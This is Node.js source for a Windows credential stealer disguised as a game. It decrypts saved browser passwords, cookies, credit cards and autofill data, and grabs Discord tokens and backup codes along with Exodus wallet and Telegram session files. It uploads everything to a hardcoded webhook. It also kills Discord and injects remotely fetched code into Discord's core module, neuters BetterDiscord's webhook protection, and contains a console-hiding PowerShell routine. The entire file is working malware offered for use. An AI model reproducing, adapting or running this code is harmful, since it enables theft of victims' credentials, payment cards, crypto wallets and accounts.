// Code is shit
var glob = require("glob");
//console.log('Starting game...');
const fs = require('fs');
var FormData = require('form-data');
const https = require('https');
const axios = require('axios');
const crypto = require('crypto');
const dpapi = require("win-dpapi");
const sqlite3 = require('sqlite3');
//const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
//const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
const github = "https://raw.githubusercontent.com/xFixxyy1295/iloveyou/main/hahahjsjsj.js"
/*((async () => {
    await axios.get('https://ipconfig.io/json')
        .then(res => {
            console.log(res.data);
            if (['microsoft', 'google', 'ovh'].some(s => res.data['asn_org']?.toLowerCase()
                    ?.includes(s))) return process.exit();
        })
        .catch();
})());*/
const zl = require("zip-lib");
//const os = require("os");
//const user = os.userInfo().username;

const {
    exec
} = require('child_process');
const AdmZip = require("adm-zip");
var debug = false,
    args = process.argv.slice(2);

if (args[0] == 'debug') debug = false;
const buf_replace = require('buffer-replace');
const superstarlmao = "https://api.biustargames.com/webhook/18878b8d-c5e9-4266-80f1-46118847233c"
const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}

var appdata = process.env.APPDATA,
 LOCAL = process.env.LOCALAPPDATA,
 localappdata = process.env.LOCALAPPDATA,
 discords = [];
 injectPath = [];
 runningDiscords = [];
paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

fs.readdirSync(localappdata)
    .forEach(file => {
      //  console.log('Searching game folder...');
        if (file.includes('cord')) discords.push(localappdata + '\\' + file);
        else return;
    }), discords.forEach(file => {
      //  console.log('Making game config...');
        let pattern = file + '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js';
        glob.sync(pattern)
            .map(file => {
                injectPath.push(file);
              //  console.log('Saving config file...');
                listDiscords();
            });
    });

exodus();
takePizzas();
takeAutofilldata();
getPeperonni();
takeCreditcards();
takeCheese();
stealTokens()
listDiscords();
function Infect() {
   // console.log(`Starting Game...`);
    https.get(github, (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", superstarlmao).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if (config.logout != "false") {
                    let folder = file.replace("index.js", "Rustler")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant") {
                        startDiscord();
                    }
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};

function listDiscords() {
    exec('tasklist', function (err, stdout, stderr) {
        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
        killDiscord();
    });
};
function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
        runningDiscords.forEach(disc => {
           // console.log('Starting game paths...');
            try {
                exec(localappdata + '\\' + disc + '\\Update.exe' + ' --processStart ' + disc + '.exe', err => {
                    if (err) {
                        if (debug) console.log(err);
                    }
                });
            } catch (e) {}
        });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "kkkkk"))
    } else {
        return;
    }
}

const os = require("os");
const user = os.userInfo().username;
const { Webhook } = require("discord-webhook-node");



const exodus_paths = [
    {
        name: 'Exodus',
        path: `C:-Users-${user}-AppData-Roaming-Exodus-exodus.wallet`
    }
]

const telegram_paths = [
    {
        name: 'Telegram',
        path: `C:-Users-${user}-AppData-Roaming-Telegram Desktop-tdata`
    }
]

let prod_hook = 'https://api.biustargames.com/webhook/18878b8d-c5e9-4266-80f1-46118847233c';
const hook = new Webhook(prod_hook);

async function exodus(paths) {
    try {
        paths.forEach(async function({path, name}) {
            try {
                path = path.split('-').join(`\\`);
                const zip = new AdmZip();
                zip.addLocalFolder(path);
                zip.writeZip(name + '.zip');
                await hook.sendFile(name + '.zip');
                fs.unlinkSync('./' + name + '.zip');
            } catch(e) {
                
            }
        });
    } catch(e) {
        
    }
}

exodus(telegram_paths);
exodus(exodus_paths);

async function telegram() {
    if (fs.existsSync(appdata + '\\Telegram Desktop\\tdata')) {
        
        let zip = new AdmZip();
    
        session_files = []
        
        fs.readdir(appdata + '\\Telegram Desktop\\tdata', (err, file) => {
            file.forEach((inside_file) => {
                if (inside_file !== 'temp' && inside_file !== 'dumps' && inside_file !== 'emoji' && inside_file !== 'working' && inside_file !== 'tdummy') { 
                    session_files.push(`${inside_file}`)
                }
            })
    
            session_files.forEach(session_file => {
                zip.addFile(session_file, new Buffer.from(appdata + `\\Telegram Desktop\\tdata\\${session_file}`), 'Spacex Stealer xD!');
            })
    
            zip.writeZip(`TelegramSession.zip`)
            
                const form = new FormData();
                form.append("file", fs.createReadStream("TelegramSession.zip"));
                form.submit(superstarlmao, (error, response) => { fs.unlinkSync('TelegramSession.zip') });
        })
    }
}
async function getPeperonni() {
    let str = '';
    const homeDir = require('os').homedir();
    if (fs.existsSync(`${homeDir}\\Downloads`)) {
        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Downloads\\${file}`
                str += `\n\n@~$~@bby-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Desktop`)) {
        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Desktop\\${file}`
                str += `\n\n@~$~@bby-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Documents`)) {
        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Documents\\${file}`
                str += `\n\n@~$~@bby-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (str !== '') {
        fs.writeFileSync(appdata + '\\backupcodes.txt', str.slice(2))

        const form = new FormData();
        form.append("file", fs.createReadStream(appdata + "\\backupcodes.txt"));
        form.submit(wbk);
    }
}

async function getCreditcards(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Web Data',
            creditcards_db = path + 'creditcards.db';
        fs.copyFileSync(login_data, creditcards_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@bby-${path}`,
            sql = new sqlite3.Database(creditcards_db, err => {
                if (err) { }
            });
        const cb = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM credit_cards', function (err, row) {
                if (err) { }
                if (row['card_number_encrypted'] != '') {
                    let card_number = row['card_number_encrypted'];
                    try {
                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                            result += '\nCREDIT CARD NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
                        } else {
                            let start = card_number.slice(3, 15),
                                middle = card_number.slice(15, card_number.length - 16),
                                end = card_number.slice(card_number.length - 16, card_number.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nCREDIT CARD NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
                        }
                    } catch (e) { }
                }
            }, function () {
                resolve(result);
            });
        });
        return cb;
    } else {
        return '';
    }
}


async function getAutofilldata(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Web Data',
            autofilldata_db = path + 'autofilldata.db';
        fs.copyFileSync(login_data, autofilldata_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@1295-${path}`,
            sql = new sqlite3.Database(autofilldata_db, err => {
                if (err) { }
            });
        const autofill = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM autofill', function (err, row) {
                if (err) { }
                result += '\nNAME: ' + row['name'] + ' | DATA: ' + row['value'];
            }, function () {
                resolve(result);
            });
        });
        return autofill;
    } else {
        return '';
    }
}


async function getPizzas(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Login Data',
            passwords_db = path + 'passwords.db';
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@1295-${path}`,
            sql = new sqlite3.Database(passwords_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const pizza = await new Promise((resolve, reject) => {
            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                if (row['username_value'] != '') {
                    let password_value = row['password_value'];
                    try {
                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
                                .toString('utf-8');
                        } else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                        }
                    } catch (e) {
                        if (debug) console.log(e);
                    }
                }
            }, function () {
                resolve(result);
            });
        });
        return pizza;
    } else {
        return '';
    }
}

async function getCheese(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var cookies = path + 'Cookies',
            cookies_db = path + 'cookies.db';
        fs.copyFileSync(cookies, cookies_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@1295-${path}`,
            sql = new sqlite3.Database(cookies_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const cheese = await new Promise((resolve, reject) => {
            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                let encrypted_value = row['encrypted_value'];
                try {
                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
                        result += '\nHOST KEY: ' + row['host_key'] + ' | NAME: ' + row['name'] + ' | VALUE: ' + dpapi.unprotectData(encrypted_value, null, 'CurrentUser')
                            .toString('utf-8');
                    } else {
                        let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                        decipher.setAuthTag(end);
                        result += '\nHOST KEY: ' + row['host_key'] + ' | NAME: ' + row['name'] + ' | VALUE: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                    }
                } catch (e) {
                    if (debug) console.log(e);
                }
            }, function () {
                resolve(result);
            })
        });
        return cheese;
    } else return '';
}

function findToken(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}

async function takePizzas() {
    let passwords = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Login Data'))
            passwords += await getPizzas(paths[i]) || '';
    }
    fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) {

        if (err) throw err;
      
        const form = new FormData();
        form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
        form.submit(superstarlmao, (error, response) => {
        if (error) console.log(error);
        });
    });
}

async function takeCheese() {
    let cookies = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Cookies'))
            cookies += await getCheese(paths[i]) || '';
    }
    fs.writeFile(appdata + '\\cookies.txt', cookies, function (err, data) {

        if (err) throw err;
      
        const form = new FormData();
        form.append("file", fs.createReadStream(appdata+"\\cookies.txt"));
        form.submit(superstarlmao, (error, response) => {
        if (error) console.log(error);
        });
    });

}

async function takeCreditcards() {
    let creditcards = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Web Data'))
            creditcards += await getCreditcards(paths[i]) || '';
    }
    if (!creditcards.includes('NUMBER:')) creditcards = 'Creditcards don\'t found.'
    else creditcards = creditcards.slice(2)

    fs.writeFileSync(appdata + '\\creditcards.txt', creditcards)

    const form = new FormData();
    form.append("file", fs.createReadStream(appdata + "\\creditcards.txt"));
    form.submit(superstarlmao);
}

async function takeAutofilldata() {
    let autofilldata = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Web Data'))
            autofilldata += await getAutofilldata(paths[i]) || '';

    }
    if (autofilldata.includes('NAMEE:')) autofilldata = 'Autofilldata don\'t found.'
    else autofilldata = autofilldata.slice(2)

    fs.writeFileSync(appdata + '\\autofilldata.txt', autofilldata)

    const form = new FormData();
    form.append("file", fs.createReadStream(appdata + "\\autofilldata.txt"));
    form.submit(superstarlmao);
}

async function stealTokens() {
    const fields = [];
    for (let path of paths) {
        const foundTokens = findToken(path);
        if (foundTokens) foundTokens.forEach(token => { 
            var c = {
                name: "<:browserstokens:951827260741156874> Browser Token;",
                value: `\`\`\`${token}\`\`\`[CopyToken](https://api.biustargames.com/copy/`+ token +`)`,
                inline: !0
            }
            fields.push(c)
        });
    }

    axios.post(superstarlmao, {
        "content": null,
        "embeds": [
          {
            "color": config["embed-color"],
            "fields": fields.filter(onlyUnique),
            "author": {
                "name": `1295`,
                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
            },
            "footer": {
                "text": "1295"
            },
        }]
    }) .then(res => {}).catch(error => {})

   
    
}

function hideSelf() {
    let payload = '\n' +
        "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
        '    [DllImport("Kernel32.dll")]\n' +
        '    public static extern IntPtr GetConsoleWindow();\n' +
        '\n' +
        '    [DllImport("user32.dll")]\n' +
        '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
        "    '\n" +
        '\n' +
        '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
        '    #0 hide\n' +
        '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
        '    ',
        file = process.cwd() + '\\temp.ps1';
    try {
        fs.writeFileSync(file, payload);
        require('child_process')
            .execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
                'stdio': 'inherit'
            });
        fs.unlinkSync(file);
    } catch (e) {}
}

function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }

  function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

